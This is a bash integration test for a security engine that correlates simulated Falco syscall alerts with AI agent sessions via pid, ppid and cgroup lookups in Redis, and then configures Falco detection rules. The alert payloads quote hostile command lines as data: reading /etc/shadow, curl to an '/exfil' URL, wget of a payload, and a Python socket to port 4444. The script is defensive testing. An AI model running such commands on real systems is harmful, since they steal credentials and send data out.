#!/usr/bin/env bash
# test-falco-cross-layer.sh
# 测试 Falco syscall 告警 → Engine 三级关联 (pid → cgroup → ppid) → session 风险评分
#
# 在 macOS 上无需 Falco，用 curl 模拟 Falco http_output 的 JSON payload，
# 验证 FalcoAlertController 的跨层关联逻辑。
#
# 前置条件:
#   1. scripts/run-local.sh 已启动 control(8080) + engine(8082) + redis(6379)
#   2. 或手动启动: redis-server + engine jar
#
set -euo pipefail

ENGINE="${VIRBIUS_ENGINE:-http://127.0.0.1:8082}"
CONTROL="${VIRBIUS_CONTROL:-http://127.0.0.1:8080}"
REDIS_PORT="${VIRBIUS_REDIS_PORT:-6379}"
TENANT="default"

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[0;33m'; NC='\033[0m'
info()  { echo -e "${CYAN}[INFO]${NC}  $*"; }
ok()    { echo -e "${GREEN}[OK]${NC}    $*"; }
warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
err()   { echo -e "${RED}[ERROR]${NC} $*"; }

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN} Falco 跨层关联测试 (macOS 模拟模式)   ${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# ─── 0. 前置检查 ───
info "检查服务可用性..."

if ! curl -sf "$ENGINE/admin/health" >/dev/null 2>&1; then
  err "Engine 不可达: $ENGINE"
  err "请先运行: ./scripts/run-local.sh"
  exit 1
fi
ok "Engine 可达"

if ! redis-cli -p "$REDIS_PORT" ping 2>/dev/null | grep -q PONG; then
  err "Redis 不可达: port $REDIS_PORT"
  exit 1
fi
ok "Redis 可达"
echo ""

# ─── 1. 种入 pidmap + cgroup 数据 ───
info "Step 1: 种入 pidmap + cgroup 数据（模拟 Agent 注册）"

# pidmap JSON value（主索引和 cgroup 反向索引共用同一 value）
PIDMAP_JSON='{"host_pid":12345,"ns_pid":42,"cgroup_id":777,"trace_id":"trace-001","session_id":"sess-test-001","app_id":"test-agent","tenant_id":"default"}'

# 主索引: pid_trace:{host_pid} — Agent 主进程 host_pid=12345
redis-cli -p "$REDIS_PORT" SET "pid_trace:12345" "$PIDMAP_JSON" EX 3600 >/dev/null
ok "pid_trace:12345 → session=sess-test-001 (Agent 主进程)"

# 反向索引: cgroup_trace:{cgroup_id} — cgroup_id=777
# 模拟 pidmap.rs::redis_backup_async() 写入的 cgroup 反向索引
redis-cli -p "$REDIS_PORT" SET "cgroup_trace:777" "$PIDMAP_JSON" EX 3600 >/dev/null
ok "cgroup_trace:777 → session=sess-test-001 (cgroup 反向索引)"

# 场景2: 子进程 host_pid=12346 不注册（模拟 fork 后子进程未在 pidmap 中）
#       但 ppid=12345 指向主进程，Engine 用 ppid fallback 关联
info "子进程 pid=12346 不注册（测试 ppid fallback）"

# 场景4: 孙子进程 pid=12347, ppid=12346 都不在 pidmap（ppid 链断）
#       但 cgroup_id=777 在 cgroup 反向索引中 → cgroup 关联
info "孙子进程 pid=12347 不注册, ppid=12346 也不在 pidmap（测试 cgroup 关联）"
echo ""

# ─── 2. 发送模拟 Falco 告警 ───
info "Step 2: 发送模拟 Falco 告警"

echo ""
echo -e "${YELLOW}--- 场景1: Agent 主进程打开 /etc/shadow (pid 直接命中) ---${NC}"
echo "  Falco 规则: sensitive_shadow_access"
echo "  proc.pid=12345 (Agent 主进程, 在 pidmap 中)"
echo "  proc.cgroup.id=777 (同 cgroup)"
echo "  预期: resolved_by=pid"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "sensitive_shadow_access",
    "priority": "Critical",
    "output": "Sensitive file access (pid=12345, ppid=1, cgroup=777, file=/etc/shadow)",
    "output_fields": {
      "evt.time": 1704067200000000000,
      "proc.pid": 12345,
      "proc.ppid": 1,
      "proc.cgroup.id": 777,
      "proc.name": "cat",
      "proc.cmdline": "cat /etc/shadow",
      "proc.pcmdline": "/agent/virbius-core",
      "fd.name": "/etc/shadow",
      "user.name": "root"
    }
  }')

echo "  Engine 响应: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"pid"'; then
  ok "场景1 PASS: 告警关联到 session=sess-test-001 (resolved_by=pid)"
else
  err "场景1 FAIL: 未关联到 session 或 resolved_by 非 pid"
fi
echo ""

echo -e "${YELLOW}--- 场景2: Agent fork 子进程外联连接 (ppid fallback) ---${NC}"
echo "  Falco 规则: agent_child_outbound"
echo "  proc.pid=12346 (子进程, 不在 pidmap)"
echo "  proc.ppid=12345 (主进程, 在 pidmap → ppid fallback)"
echo "  proc.cgroup.id=0 (模拟旧版 Falco 无 cgroup 字段, 测试 ppid 路径)"
echo "  预期: resolved_by=ppid"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "agent_child_outbound",
    "priority": "Warning",
    "output": "Agent outbound (pid=12346, ppid=12345, sip=1.2.3.4)",
    "output_fields": {
      "evt.time": 1704067200000000001,
      "proc.pid": 12346,
      "proc.ppid": 12345,
      "proc.cgroup.id": 0,
      "proc.name": "curl",
      "proc.cmdline": "curl http://1.2.3.4/exfil",
      "proc.pcmdline": "/agent/virbius-core",
      "fd.sip": "1.2.3.4",
      "fd.sport": 80,
      "user.name": "root"
    }
  }')

echo "  Engine 响应: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"ppid"'; then
  ok "场景2 PASS: 子进程通过 ppid fallback 关联到 session=sess-test-001 (resolved_by=ppid)"
else
  err "场景2 FAIL: ppid fallback 未生效或 resolved_by 非 ppid"
fi
echo ""

echo -e "${YELLOW}--- 场景3: 非 Agent 进程告警（应被过滤） ---${NC}"
echo "  Falco 规则: sensitive_shadow_access"
echo "  proc.pid=99999 (非 Agent 进程, 不在 pidmap, ppid 也不在)"
echo "  proc.cgroup.id=888 (非 Agent cgroup, 不在 cgroup_trace 中)"
echo "  预期: pid_not_mapped"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "sensitive_shadow_access",
    "priority": "Critical",
    "output": "Sensitive file access (pid=99999, ppid=1, cgroup=888, file=/etc/shadow)",
    "output_fields": {
      "proc.pid": 99999,
      "proc.ppid": 1,
      "proc.cgroup.id": 888,
      "proc.name": "cat",
      "fd.name": "/etc/shadow",
      "user.name": "root"
    }
  }')

echo "  Engine 响应: $RESULT"
if echo "$RESULT" | grep -q 'pid_not_mapped'; then
  ok "场景3 PASS: 非 Agent 进程被过滤 (pid/cgroup/ppid 均未命中)"
else
  err "场景3 FAIL: 非 Agent 进程未被过滤"
fi
echo ""

echo -e "${YELLOW}--- 场景4: Agent 孙子进程外联 (cgroup 关联, ppid 链断) ---${NC}"
echo "  Falco 规则: agent_child_outbound"
echo "  proc.pid=12347 (孙子进程, 不在 pidmap)"
echo "  proc.ppid=12346 (子进程, 也不在 pidmap → ppid 链断)"
echo "  proc.cgroup.id=777 (与 Agent 同 cgroup → cgroup 命中)"
echo "  预期: resolved_by=cgroup"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "agent_child_outbound",
    "priority": "Warning",
    "output": "Agent grandchild outbound (pid=12347, ppid=12346, cgroup=777, sip=5.6.7.8)",
    "output_fields": {
      "evt.time": 1704067200000000002,
      "proc.pid": 12347,
      "proc.ppid": 12346,
      "proc.cgroup.id": 777,
      "proc.name": "wget",
      "proc.cmdline": "wget http://5.6.7.8/payload",
      "proc.pcmdline": "bash -c curl",
      "fd.sip": "5.6.7.8",
      "fd.sport": 443,
      "user.name": "root"
    }
  }')

echo "  Engine 响应: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"cgroup"'; then
  ok "场景4 PASS: 孙子进程通过 cgroup 关联到 session=sess-test-001 (resolved_by=cgroup)"
else
  err "场景4 FAIL: cgroup 关联未生效或 resolved_by 非 cgroup"
fi
echo ""

echo -e "${YELLOW}--- 场景5: setsid detach 后 ppid=1 但 cgroup 命中 ---${NC}"
echo "  Falco 规则: agent_child_outbound"
echo "  proc.pid=12348 (detach 后的进程, 不在 pidmap)"
echo "  proc.ppid=1 (setsid 后 ppid 指向 init, 不在 pidmap → ppid 无用)"
echo "  proc.cgroup.id=777 (与 Agent 同 cgroup → cgroup 命中)"
echo "  预期: resolved_by=cgroup (ppid=1 被 init 过滤)"
echo ""

RESULT=$(curl -s -X POST "$ENGINE/api/internal/falco-alert" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule": "agent_child_outbound",
    "priority": "Warning",
    "output": "Agent detached outbound (pid=12348, ppid=1, cgroup=777, sip=9.10.11.12)",
    "output_fields": {
      "evt.time": 1704067200000000003,
      "proc.pid": 12348,
      "proc.ppid": 1,
      "proc.cgroup.id": 777,
      "proc.name": "python3",
      "proc.cmdline": "python3 -c import socket;socket.connect((9.10.11.12,4444))",
      "proc.pcmdline": "bash -c setsid",
      "fd.sip": "9.10.11.12",
      "fd.sport": 4444,
      "user.name": "root"
    }
  }')

echo "  Engine 响应: $RESULT"
if echo "$RESULT" | grep -q '"sess-test-001"' && echo "$RESULT" | grep -q '"cgroup"'; then
  ok "场景5 PASS: setsid detach 后通过 cgroup 关联到 session (resolved_by=cgroup)"
else
  err "场景5 FAIL: setsid 场景 cgroup 关联未生效"
fi
echo ""

# ─── 3. 验证风险评分 ───
info "Step 3: 验证风险评分"
echo ""

FALCO_PENDING=$(redis-cli -p "$REDIS_PORT" GET "session:sess-test-001:falco_pending" 2>/dev/null || echo "0")
echo "  session:sess-test-001:falco_pending = $FALCO_PENDING"
echo "  (预期值=4: 场景1+2+4+5 各 INCR 一次, 场景3 被过滤不计)"

if [[ "$FALCO_PENDING" == "4" ]]; then
  ok "风险评分 PASS: falco_pending=4 (4 条 Agent 告警已计入)"
else
  warn "falco_pending=$FALCO_PENDING (预期 4, 可能 Engine 未连接 Redis 或 onFalcoAlert 未执行)"
fi
echo ""

# ─── 4. 通过 Control 配置 Falco 规则（验证下发管线） ───
info "Step 4: 通过 Control 运营台配置 Falco 规则"
echo ""

if ! curl -sf "$CONTROL/api/v1/health" >/dev/null 2>&1; then
  warn "Control 不可达, 跳过规则下发测试"
  echo ""
  exit 0
fi

info "配置规则: sensitive_shadow_access"
curl -s -X POST "$CONTROL/api/v1/admin/tenants/$TENANT/rules" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule_id": "sensitive_shadow_access",
    "bundle_id": "poc-default",
    "layer": "falco",
    "runtime": "falco",
    "reason_code": "CRITICAL",
    "risk_score": 50,
    "intent_action": "allow",
    "scope": {"description": "检测 /etc/shadow 访问"},
    "body": {
      "condition": "evt.type in (open, openat, openat2) and fd.name=/etc/shadow",
      "output": "Sensitive file access (pid=%proc.pid, ppid=%proc.ppid, cgroup=%proc.cgroup.id, file=%fd.name, pcmdline=%proc.pcmdline)",
      "tags": "agent,filesystem,sensitive"
    }
  }' >/dev/null && ok "规则 sensitive_shadow_access 已保存" || warn "保存失败"

info "配置规则: agent_child_outbound"
curl -s -X POST "$CONTROL/api/v1/admin/tenants/$TENANT/rules" \
  -H 'Content-Type: application/json' \
  -d '{
    "rule_id": "agent_child_outbound",
    "bundle_id": "poc-default",
    "layer": "falco",
    "runtime": "falco",
    "reason_code": "WARNING",
    "risk_score": 30,
    "intent_action": "allow",
    "scope": {"description": "检测 Agent 子进程外联"},
    "body": {
      "condition": "evt.type=connect and not fd.sip in (127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
      "output": "Agent outbound (pid=%proc.pid, ppid=%proc.ppid, cgroup=%proc.cgroup.id, sip=%fd.sip, pcmdline=%proc.pcmdline)",
      "tags": "agent,network,child_process"
    }
  }' >/dev/null && ok "规则 agent_child_outbound 已保存" || warn "保存失败"

info "发布快照（触发 config_subscriber 热重载）"
curl -s -X POST "$CONTROL/api/v1/admin/tenants/$TENANT/rules/_/runtime/publish-snapshot" \
  -H 'Content-Type: application/json' >/dev/null && ok "快照已发布" || warn "发布失败"

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN} 测试完成                                 ${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "验证项:"
echo "  1. Falco JSON → Engine FalcoAlertController 解析"
echo "  2. proc.pid → Redis pidmap 反查 → session_id (resolved_by=pid)"
echo "  3. ppid fallback (直接子进程关联, resolved_by=ppid)"
echo "  4. cgroup 关联 (孙子进程, ppid 链断, resolved_by=cgroup)"
echo "  5. cgroup 关联 (setsid detach, ppid=1, resolved_by=cgroup)"
echo "  6. 非 Agent 进程过滤 (pid/cgroup/ppid 均未命中)"
echo "  7. 风险评分 pending 计数 (4 条 Agent 告警)"
echo "  8. Control 运营台规则配置 + 下发 (含 proc.cgroup.id 字段)"
echo ""
echo "查看 Engine 日志:"
echo "  tail -50 /tmp/virbius-agent/logs/engine.log"
echo ""
echo "如需测试真实 Falco (需 Docker):"
echo "  brew install --cask docker"
echo "  # 启动 Docker Desktop 后运行:"
echo "  docker run --rm -d --name falco --privileged \\"
echo "    -v /dev:/dev -v /proc:/host/proc:ro \\"
echo "    -e FALCO_HTTP_OUTPUT_URL=http://host.docker.internal:8082/api/internal/falco-alert \\"
echo "    falcosecurity/falco:0.39.0 --modern"
echo ""
